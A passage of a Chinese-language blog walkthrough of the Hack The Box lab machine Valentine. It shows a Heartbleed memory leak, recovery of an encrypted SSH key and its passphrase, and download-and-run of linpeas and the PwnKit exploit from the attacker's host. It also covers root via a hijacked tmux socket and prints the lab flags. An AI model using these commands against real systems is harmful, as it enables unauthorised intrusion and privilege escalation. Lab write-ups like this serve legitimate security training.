+</span></span><span class="line"><span class="cl">└─$ python2 32764.py -h
+</span></span><span class="line"><span class="cl">Usage: 32764.py server <span class="o">[</span>options<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Test <span class="k">for</span> SSL heartbeat vulnerability <span class="o">(</span>CVE-2014-0160<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Options:
+</span></span><span class="line"><span class="cl">  -h, --help            show this <span class="nb">help</span> message and <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl">  -p PORT, --port<span class="o">=</span>PORT  TCP port to <span class="nb">test</span> <span class="o">(</span>default: 443<span class="o">)</span>
+</span></span></code></pre></div><p>漏洞利用：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ python2 32764.py 10.10.10.79
+</span></span><span class="line"><span class="cl">Trying SSL 3.0...
+</span></span><span class="line"><span class="cl">Connecting...
+</span></span><span class="line"><span class="cl">Sending Client Hello...
+</span></span><span class="line"><span class="cl">Waiting <span class="k">for</span> Server Hello...
+</span></span><span class="line"><span class="cl"> ... received message: <span class="nb">type</span> <span class="o">=</span> 22, <span class="nv">ver</span> <span class="o">=</span> 0300, <span class="nv">length</span> <span class="o">=</span> <span class="m">94</span>
+</span></span><span class="line"><span class="cl"> ... received message: <span class="nb">type</span> <span class="o">=</span> 22, <span class="nv">ver</span> <span class="o">=</span> 0300, <span class="nv">length</span> <span class="o">=</span> <span class="m">885</span>
+</span></span><span class="line"><span class="cl"> ... received message: <span class="nb">type</span> <span class="o">=</span> 22, <span class="nv">ver</span> <span class="o">=</span> 0300, <span class="nv">length</span> <span class="o">=</span> <span class="m">331</span>
+</span></span><span class="line"><span class="cl"> ... received message: <span class="nb">type</span> <span class="o">=</span> 22, <span class="nv">ver</span> <span class="o">=</span> 0300, <span class="nv">length</span> <span class="o">=</span> <span class="m">4</span>
+</span></span><span class="line"><span class="cl">Sending heartbeat request...
+</span></span><span class="line"><span class="cl"> ... received message: <span class="nb">type</span> <span class="o">=</span> 24, <span class="nv">ver</span> <span class="o">=</span> 0300, <span class="nv">length</span> <span class="o">=</span> <span class="m">16384</span>
+</span></span><span class="line"><span class="cl">Received heartbeat response:
+</span></span><span class="line"><span class="cl">  0000: <span class="m">02</span> <span class="m">40</span> <span class="m">00</span> D8 <span class="m">03</span> <span class="m">00</span> <span class="m">53</span> <span class="m">43</span> 5B <span class="m">90</span> 9D 9B <span class="m">72</span> 0B BC 0C  .@....SC<span class="o">[</span>...r...
+</span></span><span class="line"><span class="cl">  0010: BC 2B <span class="m">92</span> A8 <span class="m">48</span> <span class="m">97</span> CF BD <span class="m">39</span> <span class="m">04</span> CC <span class="m">16</span> 0A <span class="m">85</span> <span class="m">03</span> <span class="m">90</span>  .+..H...9.......
+</span></span><span class="line"><span class="cl">  0020: 9F <span class="m">77</span> <span class="m">04</span> <span class="m">33</span> D4 DE <span class="m">00</span> <span class="m">00</span> <span class="m">66</span> C0 <span class="m">14</span> C0 0A C0 <span class="m">22</span> C0  .w.3....f.....<span class="s2">&#34;.
+</span></span></span><span class="line"><span class="cl"><span class="s2">  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
+</span></span></span></code></pre></div><p>同样，因为信息泄露的不确定性，我们需要多执行几次，以发现所期望的敏感信息。</p>
+<p><img loading="lazy" src="/resource/012-Valentine.assets/image-20230429160817669.png" srcset="/resource/012-Valentine.assets/image-20230429160817669.png, /resource/012-Valentine.assets/image-20230429160817669.png 1.5x, /resource/012-Valentine.assets/image-20230429160817669.png 2x" sizes="auto" data-title="image-20230429160817669" data-alt="image-20230429160817669" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>执行了多次后，发现泄露了如下信息：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....<span class="nv">$text</span><span class="o">=</span><span class="nv">aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg</span><span class="o">==</span>.
+</span></span></code></pre></div><p>对<code>$text</code>的值<code>aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</code>进行base64解密</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ <span class="nb">echo</span> <span class="s2">&#34;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&#34;</span> <span class="p">|</span> base64 -d
+</span></span><span class="line"><span class="cl">heartbleedbelievethehype
+</span></span></code></pre></div><h2 id="web扫描">Web扫描</h2>
+<p>这边decode.php也提示我忘了一个环节：对Web路径的探测，这里补一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ dirsearch -e php,html,txt -t <span class="m">100</span> -u https://10.10.10.79/ 
+</span></span><span class="line"><span class="cl">Target: https://10.10.10.79/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>16:14:19<span class="o">]</span> Starting: 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>16:15:27<span class="o">]</span> <span class="m">301</span> -  310B  - /dev  -&gt;  https://10.10.10.79/dev/  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>16:15:27<span class="o">]</span> <span class="m">200</span> -    1KB - /dev/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>16:15:39<span class="o">]</span> <span class="m">200</span> -   38B  - /index.php  
+</span></span></code></pre></div><p>访问dev目录如下：</p>
+<p><img loading="lazy" src="/resource/012-Valentine.assets/image-20230429161913176.png" srcset="/resource/012-Valentine.assets/image-20230429161913176.png, /resource/012-Valentine.assets/image-20230429161913176.png 1.5x, /resource/012-Valentine.assets/image-20230429161913176.png 2x" sizes="auto" data-title="image-20230429161913176" data-alt="image-20230429161913176" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>查看notes.txt</p>
+<pre tabindex="0"><code>To do:
+
+1) Coffee.
+2) Research.
+3) Fix decoder/encoder before going live.
+4) Make sure encoding/decoding is only done client-side.
+5) Don&#39;t use the decoder/encoder until any of this is done.
+6) Find a better way to take notes.
+</code></pre><p>查看hype_key：</p>
+<p><img loading="lazy" src="/resource/012-Valentine.assets/image-20230429163925200.png" srcset="/resource/012-Valentine.assets/image-20230429163925200.png, /resource/012-Valentine.assets/image-20230429163925200.png 1.5x, /resource/012-Valentine.assets/image-20230429163925200.png 2x" sizes="auto" data-title="image-20230429163925200" data-alt="image-20230429163925200" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>下载hype_key</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ wget https://10.10.10.79/dev/hype_key --no-check-certificate
+</span></span></code></pre></div><p>然后通过xxd 对十六进制进行转换：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ xxd -r -p hype_key 
+</span></span><span class="line"><span class="cl">-----BEGIN RSA PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">Proc-Type: 4,ENCRYPTED
+</span></span><span class="line"><span class="cl">DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
+</span></span><span class="line"><span class="cl">5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
+</span></span><span class="line"><span class="cl">0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
+</span></span><span class="line"><span class="cl">Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
+</span></span><span class="line"><span class="cl">OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
+</span></span><span class="line"><span class="cl">pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
+</span></span><span class="line"><span class="cl">QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
+</span></span><span class="line"><span class="cl">p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
+</span></span><span class="line"><span class="cl">Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
+</span></span><span class="line"><span class="cl">t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
+</span></span><span class="line"><span class="cl">XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
+</span></span><span class="line"><span class="cl">aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+</span></span><span class="line"><span class="cl">+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
+</span></span><span class="line"><span class="cl">AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
+</span></span><span class="line"><span class="cl">r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
+</span></span><span class="line"><span class="cl">2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
+</span></span><span class="line"><span class="cl">e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
+</span></span><span class="line"><span class="cl">09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
+</span></span><span class="line"><span class="cl">dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
+</span></span><span class="line"><span class="cl">cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
+</span></span><span class="line"><span class="cl">pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
+</span></span><span class="line"><span class="cl">Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
+</span></span><span class="line"><span class="cl">suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
+</span></span><span class="line"><span class="cl">l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
+</span></span><span class="line"><span class="cl">RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
+</span></span><span class="line"><span class="cl">-----END RSA PRIVATE KEY----- 
+</span></span></code></pre></div><p>可以看到是一个RSA私钥，接下去用ssh进行连接</p>
+<h2 id="初始shell">初始shell</h2>
+<p>对hype_key进行转码，并通过ssh进行连接</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ xxd -r -p hype_key &gt; hype_key.rsa
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ chmod <span class="m">600</span> hype_key.rsa
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh -i hype_key.rsa hype@10.10.10.79
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;hype_key.rsa&#39;</span>: 
+</span></span></code></pre></div><p>这里私钥有密码，想到了之前decode中获取的字符串：heartbleedbelievethehype</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh -i hype_key.rsa hype@10.10.10.79
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;hype_key.rsa&#39;</span>: 
+</span></span><span class="line"><span class="cl">sign_and_send_pubkey: no mutual signature supported
+</span></span><span class="line"><span class="cl">hype@10.10.10.79<span class="err">&#39;</span>s password: 
+</span></span></code></pre></div><p>这里有个报错，因为新版本的ssh不再支持一些弱加密算法，所以如果要用的话需要手动指定<code>-o PubkeyAcceptedKeyTypes=+ssh-rsa</code>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh -i hype_key.rsa hype@10.10.10.79 -o <span class="nv">PubkeyAcceptedKeyTypes</span><span class="o">=</span>+ssh-rsa
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;hype_key.rsa&#39;</span>: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 12.04 LTS <span class="o">(</span>GNU/Linux 3.2.0-23-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">New release <span class="s1">&#39;14.04.5 LTS&#39;</span> available.
+</span></span><span class="line"><span class="cl">Run <span class="s1">&#39;do-release-upgrade&#39;</span> to upgrade to it.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Fri Feb <span class="m">16</span> 14:50:29 <span class="m">2018</span> from 10.10.14.3
+</span></span><span class="line"><span class="cl">hype@Valentine:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>hype<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>hype<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>hype<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,124<span class="o">(</span>sambashare<span class="o">)</span>
+</span></span><span class="line"><span class="cl">hype@Valentine:~$ 
+</span></span></code></pre></div><p>这里也可以修改SSH配置文件，在文件末尾追加以下内容</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Host *
+</span></span><span class="line"><span class="cl">    <span class="nv">PubkeyAcceptedKeyTypes</span><span class="o">=</span>+ssh-rsa
+</span></span><span class="line"><span class="cl">    <span class="nv">HostKeyAlgorithms</span><span class="o">=</span>+ssh-rsa
+</span></span></code></pre></div><p><img loading="lazy" src="/resource/012-Valentine.assets/image-20230429170722849.png" srcset="/resource/012-Valentine.assets/image-20230429170722849.png, /resource/012-Valentine.assets/image-20230429170722849.png 1.5x, /resource/012-Valentine.assets/image-20230429170722849.png 2x" sizes="auto" data-title="image-20230429170722849" data-alt="image-20230429170722849" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h2 id="root-shell">root shell</h2>
+<p>上传linpeas.sh进行信息搜集，利用Python和wget进行上传</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># kali</span>
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/tools<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ python3 -m http.server <span class="m">80</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</span></span><span class="line"><span class="cl">10.10.10.79 - - <span class="o">[</span>29/Apr/2023 17:10:53<span class="o">]</span> <span class="s2">&#34;GET /linpeas.sh HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Victim</span>
+</span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ wget http://10.10.14.22/linpeas.sh
+</span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ chmod +x linpeas.sh
+</span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ ./linpeas.sh &gt; result.txt
+</span></span></code></pre></div><p>利用同样的方式，再把result.txt下载到本地</p>
+<h3 id="cve-2021-4034">CVE-2021-4034</h3>
+<p>查看result.txt，发现系统存在sudo CVE-2021-4034漏洞，可利用该漏洞提权。</p>
+<p><img loading="lazy" src="/resource/012-Valentine.assets/image-20230429172250485.png" srcset="/resource/012-Valentine.assets/image-20230429172250485.png, /resource/012-Valentine.assets/image-20230429172250485.png 1.5x, /resource/012-Valentine.assets/image-20230429172250485.png 2x" sizes="auto" data-title="image-20230429172250485" data-alt="image-20230429172250485" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hype@Valentine:/tmp$ wget http://10.10.14.22/PwnKit
+</span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ chmod +x PwnKit 
+</span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ ./PwnKit 
+</span></span><span class="line"><span class="cl">root@Valentine:/tmp# id  
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,124<span class="o">(</span>sambashare<span class="o">)</span>,1000<span class="o">(</span>hype<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@Valentine:/tmp# 
+</span></span></code></pre></div><p><img loading="lazy" src="/resource/012-Valentine.assets/image-20230429172533596.png" srcset="/resource/012-Valentine.assets/image-20230429172533596.png, /resource/012-Valentine.assets/image-20230429172533596.png 1.5x, /resource/012-Valentine.assets/image-20230429172533596.png 2x" sizes="auto" data-title="image-20230429172533596" data-alt="image-20230429172533596" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@Valentine:/tmp# cat /root/root.txt 
+</span></span><span class="line"><span class="cl">adf6f323296f600cec9294d64c6c9bc1
+</span></span><span class="line"><span class="cl">root@Valentine:/tmp# cat /home/hype/user.txt 
+</span></span><span class="line"><span class="cl">0b946d1f7c12bb371585d67c10557dc8
+</span></span></code></pre></div><h3 id="tmux提权">tmux提权</h3>
+<p>查看result.txt，发现tmux session</p>
+<p><img loading="lazy" src="/resource/012-Valentine.assets/image-20230429174112440.png" srcset="/resource/012-Valentine.assets/image-20230429174112440.png, /resource/012-Valentine.assets/image-20230429174112440.png 1.5x, /resource/012-Valentine.assets/image-20230429174112440.png 2x" sizes="auto" data-title="image-20230429174112440" data-alt="image-20230429174112440" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>通过tmux进行提权，成功获取root权限：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hype@Valentine:/tmp$ tmux -S /.devs/dev_sess
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@Valentine:/tmp# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@Valentine:/tmp# 
+</span></span></code></pre></div><p><img loading="lazy" src="/resource/012-Valentine.assets/image-20230429174244442.png" srcset="/resource/012-Valentine.assets/image-20230429174244442.png, /resource/012-Valentine.assets/image-20230429174244442.png 1.5x, /resource/012-Valentine.assets/image-20230429174244442.png 2x" sizes="auto" data-title="image-20230429174244442" data-alt="image-20230429174244442" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h2 id="end">END</h2></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2023-05-01&#32;19:55:27>更新于 2023-05-01&nbsp;</span>
+      </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/htb/' class="post-tag">HTB</a><a href='/tags/oscp/' class="post-tag">OSCP</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/20230425-shellspawn/" class="post-nav-item" rel="prev" title="Shell Spawning"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Shell Spawning</a>
+      <a href="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/" class="post-nav-item" rel="next" title="018-SQL注入之GroupBy位置点注入">018-SQL注入之GroupBy位置点注入<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="XavierRoot/XavierBlog"
+            data-repo-id="R_kgDOHswyxg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOHswyxs4Cd2zm"
+            data-mapping="title"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="en"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"lunr"},"twemoji":true};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
